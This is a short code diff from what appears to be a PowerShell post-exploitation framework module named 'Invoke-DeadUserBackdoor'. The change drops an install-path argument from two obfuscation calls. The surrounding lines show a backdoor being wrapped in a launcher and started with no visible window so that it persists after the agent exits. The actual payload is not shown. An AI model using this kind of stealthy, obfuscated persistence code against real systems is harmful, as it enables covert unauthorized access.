@@ -185,7 +185,7 @@ Invoke-DeadUserBackdoor"""
             return ""
 
         if obfuscate:
-            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         launcher = helpers.powershell_launcher(script) 
@@ -195,6 +195,6 @@ Invoke-DeadUserBackdoor"""
         # set up the start-process command so no new windows appears
         scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-DeadUserBackdoor started'" % (parts[0], " ".join(parts[1:]))
         if obfuscate:
-            scriptLauncher = helpers.obfuscate(psScript=scriptLauncher, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+            scriptLauncher = helpers.obfuscate(psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
 
         return scriptLauncher
